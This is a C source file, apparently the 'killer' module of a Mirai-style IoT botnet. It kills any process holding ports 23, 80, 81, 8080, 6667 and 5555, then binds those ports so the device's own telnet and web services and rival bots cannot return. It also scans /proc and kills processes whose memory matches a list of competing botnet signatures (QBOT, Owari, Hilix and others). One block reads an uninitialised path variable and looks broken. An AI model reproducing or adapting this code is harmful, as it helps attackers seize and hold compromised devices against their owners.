#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

int killer_pid = 0;
char *killer_realpath;
int killer_realpath_len = 0;

void killer_init(void)
{
    int killer_highest_pid = KILLER_MIN_PID, last_pid_scan = time(NULL), tmp_bind_fd;
    uint32_t scan_counter = 0;
    struct sockaddr_in tmp_bind_addr;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    tmp_bind_addr.sin_family = AF_INET;
    tmp_bind_addr.sin_addr.s_addr = INADDR_ANY;

    if(killer_kill_by_port(htons(23)))
    {
        tmp_bind_addr.sin_port = htons(23);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
	if(killer_kill_by_port(htons(80)))
    {
        tmp_bind_addr.sin_port = htons(80);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
	if(killer_kill_by_port(htons(81)))
    {
        tmp_bind_addr.sin_port = htons(81);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
	if(killer_kill_by_port(htons(8080)))
    {
        tmp_bind_addr.sin_port = htons(8080);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
	if(killer_kill_by_port(htons(6667)))
    {
        tmp_bind_addr.sin_port = htons(6667);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
	if(killer_kill_by_port(htons(5555)))
    {
        tmp_bind_addr.sin_port = htons(5555);

        if((tmp_bind_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1)
        {
            bind(tmp_bind_fd, (struct sockaddr *)&tmp_bind_addr, sizeof(struct sockaddr_in));
            listen(tmp_bind_fd, 1);
        }
    }
	
    sleep(5);

    killer_realpath = malloc(PATH_MAX);
    killer_realpath[0] = 0;
    killer_realpath_len = 0;

    #ifdef DEBUG
        printf("[killer] memory scanning processes\n");
    #endif

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        table_unlock_val(TABLE_KILLER_PROC);
        if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) == NULL)
        {
            #ifdef DEBUG
                printf("[killer] failed to open /proc!\n");
            #endif
            break;
        }
        table_lock_val(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64], *ptr_maps_path = maps_path, realpath[PATH_MAX];
            int rp_len = 0, fd = 0, pid = util_atoi(file->d_name, 10);

            scan_counter++;
            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    #ifdef DEBUG
                        printf("[killer] %d seconds have passed since last scan. re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
                    #endif
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;
            last_pid_scan = time(NULL);

            table_unlock_val(TABLE_KILLER_PROC);
            table_unlock_val(TABLE_KILLER_MAPS);

            #ifdef DEBUG
                printf("[killer] scanning pid %d\n", pid);
            #endif

            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, table_retrieve_val(TABLE_KILLER_MAPS, NULL));

            #ifdef DEBUG
                printf("[killer] scanning %s\n", maps_path);;
            #endif

            table_lock_val(TABLE_KILLER_PROC);
            table_lock_val(TABLE_KILLER_MAPS);
			
			// Skip this file if its realpath == killer_realpath
                if (pid == getpid() || pid == getppid() || util_strcmp(realpath, killer_realpath))
                    continue;

                if ((fd = open(realpath, O_RDONLY)) == -1)
                {
#ifdef DEBUG
                    printf("[killer] Process '%s' has deleted binary!\n", realpath);
#endif
                    kill(pid, 9);
                }
                close(fd);
            

            if(maps_scan_match(maps_path))
            {
#ifdef DEBUG
                printf("[killer] Memory scan match for binary %s\n", maps_path);
#endif
                kill(pid, 9);
				
            }

            util_zero(maps_path, sizeof(maps_path));

            sleep(1);
        }

        closedir(dir);
	}

    #ifdef DEBUG
        printf("[killer] finished\n");
    #endif
}

void killer_kill(void)
{
    kill(killer_pid, 9);
}

BOOL killer_kill_by_port(port_t port)
{
    DIR *dir, *fd_dir;
    struct dirent *entry, *fd_entry;
    char path[PATH_MAX] = {0}, exe[PATH_MAX] = {0}, buffer[513] = {0};
    int pid = 0, fd = 0;
    char inode[16] = {0};
    char *ptr_path = path;
    int ret = 0;
    char port_str[16];

    #ifdef DEBUG
        printf("[killer] finding and killing processes holding port %d\n", ntohs(port));
    #endif

    util_itoa(ntohs(port), 16, port_str);
    if(util_strlen(port_str) == 2)
    {
        port_str[2] = port_str[0];
        port_str[3] = port_str[1];
        port_str[4] = 0;

        port_str[0] = '0';
        port_str[1] = '0';
    }

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    table_unlock_val(TABLE_KILLER_FD);
    table_unlock_val(TABLE_KILLER_TCP);

    fd = open(table_retrieve_val(TABLE_KILLER_TCP, NULL), O_RDONLY);
    if(fd == -1)
        return 0;

    while(util_fdgets(buffer, 512, fd) != NULL)
    {
        int i = 0, ii = 0;

        while(buffer[i] != 0 && buffer[i] != ':')
            i++;

        if(buffer[i] == 0) continue;
        i += 2;
        ii = i;

        while(buffer[i] != 0 && buffer[i] != ' ')
            i++;
        buffer[i++] = 0;

        if(util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str) != -1)
        {
            int column_index = 0;
            BOOL in_column = FALSE;
            BOOL listening_state = FALSE;

            while(column_index < 7 && buffer[++i] != 0)
            {
                if(buffer[i] == ' ' || buffer[i] == '\t')
                    in_column = TRUE;
                else
                {
                    if(in_column == TRUE)
                        column_index++;

                    if(in_column == TRUE && column_index == 1 && buffer[i + 1] == 'A')
                    {
                        listening_state = TRUE;
                    }

                    in_column = FALSE;
                }
            }
            ii = i;

            if(listening_state == FALSE)
                continue;

            while(buffer[i] != 0 && buffer[i] != ' ')
                i++;
            buffer[i++] = 0;

            if(util_strlen(&(buffer[ii])) > 15)
                continue;

            util_strcpy(inode, &(buffer[ii]));
            break;
        }
    }

    close(fd);

    if(util_strlen(inode) == 0)
    {
        #ifdef DEBUG
            printf("failed to find inode for port %d\n", ntohs(port));
        #endif

        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_EXE);
        table_lock_val(TABLE_KILLER_FD);
        table_lock_val(TABLE_KILLER_TCP);

        return 0;
    }

    #ifdef DEBUG
        printf("found inode \"%s\" for port %d\n", inode, ntohs(port));
    #endif

    if((dir = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL))) != NULL)
    {
        while((entry = readdir(dir)) != NULL && ret == 0)
        {
            char *pid = entry->d_name;

            if(*pid < '0' || *pid > '9')
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_EXE, NULL));

            if(readlink(path, exe, PATH_MAX) == -1)
                continue;

            util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
            util_strcpy(ptr_path + util_strlen(ptr_path), pid);
            util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
            if((fd_dir = opendir(path)) != NULL)
            {
                while((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    char *fd_str = fd_entry->d_name;

                    util_zero(exe, PATH_MAX);
                    util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), pid);
                    util_strcpy(ptr_path + util_strlen(ptr_path), table_retrieve_val(TABLE_KILLER_FD, NULL));
                    util_strcpy(ptr_path + util_strlen(ptr_path), "/");
                    util_strcpy(ptr_path + util_strlen(ptr_path), fd_str);
                    if(readlink(path, exe, PATH_MAX) == -1)
                        continue;

                    if(util_stristr(exe, util_strlen(exe), inode) != -1)
                    {
                        kill(util_atoi(pid, 10), 9);
                        ret = 1;
                    }
                }
                closedir(fd_dir);
            }
        }
        closedir(dir);
    }

    sleep(1);

    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);
    table_lock_val(TABLE_KILLER_FD);
    table_lock_val(TABLE_KILLER_TCP);

    return ret;
}

static BOOL maps_scan_match(char *path)
{
    char rdbuf[512];
    BOOL found = FALSE;
    int fd = 0, ret = 0;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;
	
	table_unlock_val(TABLE_KILLER_ARES);
	table_unlock_val(TABLE_KILLER_HITO);
	table_unlock_val(TABLE_KILLER_HORIZON);
	table_unlock_val(TABLE_KILLER_PLEX);
	table_unlock_val(TABLE_KILLER_HILIX);
	table_unlock_val(TABLE_KILLER_MANA);
	table_unlock_val(TABLE_KILLER_AKIRU);
	table_unlock_val(TABLE_KILLER_AMACANO);
	table_unlock_val(TABLE_KILLER_HOHO);
	table_unlock_val(TABLE_KILLER_HYBRID);
	table_unlock_val(TABLE_KILLER_KALON);
	table_unlock_val(TABLE_KILLER_KANASHI);
	table_unlock_val(TABLE_KILLER_KURIA);
	table_unlock_val(TABLE_KILLER_LEET);
	table_unlock_val(TABLE_KILLER_MESSIAH);
	table_unlock_val(TABLE_KILLER_KOWAI);
	table_unlock_val(TABLE_KILLER_OWARI2);
	table_unlock_val(TABLE_KILLER_TOKYO);
	table_unlock_val(TABLE_KILLER_TSUNAMI);
	table_unlock_val(TABLE_KILLER_ICE);
	table_unlock_val(TABLE_KILLER_YAKUZA);
	table_unlock_val(TABLE_KILLER_ZEHIR);
	table_unlock_val(TABLE_KILLER_HITORI);
	table_unlock_val(TABLE_KILLER_OKANE);
	table_unlock_val(TABLE_KILLER_QBOT1);
    table_unlock_val(TABLE_KILLER_QBOT2);
    table_unlock_val(TABLE_KILLER_QBOT3);
    table_unlock_val(TABLE_KILLER_UPX);
    table_unlock_val(TABLE_KILLER_ROUTE);
    table_unlock_val(TABLE_KILLER_RC);
    table_unlock_val(TABLE_KILLER_BINSH);
	table_unlock_val(TABLE_KILLER_TAORETA);
	table_unlock_val(TABLE_KILLER_SWITCHBLADE);
	table_unlock_val(TABLE_KILLER_INFERNO1);

    while((ret = read(fd, rdbuf, sizeof(rdbuf))) > 0)
    {
        if(mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_ARES, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ARES, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HITO, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HITO, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HORIZON, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HORIZON, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_PLEX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_PLEX, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HILIX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HILIX, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_MANA, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_MANA, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_AKIRU, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_AKIRU, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_AMACANO, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_AMACANO, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HOHO, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HOHO, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HYBRID, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HYBRID, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_KALON, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_KALON, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_KANASHI, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_KANASHI, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_KURIA, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_KURIA, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_LEET, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_LEET, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_MESSIAH, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_MESSIAH, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_KOWAI, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_KOWAI, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_OWARI2, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_OWARI2, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_TOKYO, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TOKYO, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_TSUNAMI, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TSUNAMI, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_ICE, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ICE, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_YAKUZA, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_YAKUZA, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_ZEHIR, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ZEHIR, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_HITORI, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_HITORI, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_QBOT1, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_QBOT1, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_QBOT2, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_QBOT2, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_QBOT3, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_QBOT3, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_UPX, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_UPX, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_ROUTE, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_ROUTE, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_RC, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_RC, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_BINSH, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_BINSH, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_TAORETA, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_TAORETA, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_SWITCHBLADE, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_SWITCHBLADE, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_INFERNO1, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_INFERNO1, NULL))) ||
		   mem_exists(rdbuf, ret, table_retrieve_val(TABLE_KILLER_OKANE, NULL), util_strlen(table_retrieve_val(TABLE_KILLER_OKANE, NULL))))
        {
            found = TRUE;
            break;
        }
    }

    table_lock_val(TABLE_KILLER_ARES);
	table_lock_val(TABLE_KILLER_HITO);
	table_lock_val(TABLE_KILLER_HORIZON);
	table_lock_val(TABLE_KILLER_PLEX);
	table_lock_val(TABLE_KILLER_HILIX);
	table_lock_val(TABLE_KILLER_MANA);
	table_lock_val(TABLE_KILLER_AKIRU);
	table_lock_val(TABLE_KILLER_AMACANO);
	table_lock_val(TABLE_KILLER_HOHO);
	table_lock_val(TABLE_KILLER_HYBRID);
	table_lock_val(TABLE_KILLER_KALON);
	table_lock_val(TABLE_KILLER_KANASHI);
	table_lock_val(TABLE_KILLER_KURIA);
	table_lock_val(TABLE_KILLER_LEET);
	table_lock_val(TABLE_KILLER_MESSIAH);
	table_lock_val(TABLE_KILLER_KOWAI);
	table_lock_val(TABLE_KILLER_OWARI2);
	table_lock_val(TABLE_KILLER_TOKYO);
	table_lock_val(TABLE_KILLER_TSUNAMI);
	table_lock_val(TABLE_KILLER_ICE);
	table_lock_val(TABLE_KILLER_YAKUZA);
	table_lock_val(TABLE_KILLER_ZEHIR);
	table_lock_val(TABLE_KILLER_HITORI);
	table_lock_val(TABLE_KILLER_OKANE);
	table_lock_val(TABLE_KILLER_QBOT1);
    table_lock_val(TABLE_KILLER_QBOT2);
    table_lock_val(TABLE_KILLER_QBOT3);
    table_lock_val(TABLE_KILLER_UPX);
    table_lock_val(TABLE_KILLER_ROUTE);
    table_lock_val(TABLE_KILLER_RC);
    table_lock_val(TABLE_KILLER_BINSH);
	table_lock_val(TABLE_KILLER_TAORETA);
	table_lock_val(TABLE_KILLER_SWITCHBLADE);
	table_lock_val(TABLE_KILLER_INFERNO1);

    close(fd);

    return found;
}

static BOOL mem_exists(char *buf, int buf_len, char *str, int str_len)
{
    int matches = 0;

    if(str_len > buf_len)
        return FALSE;

    while(buf_len--)
    {
        if(*buf++ == str[matches])
        {
            if(++matches == str_len)
                return TRUE;
        }
        else
            matches = 0;
    }

    return FALSE;
}
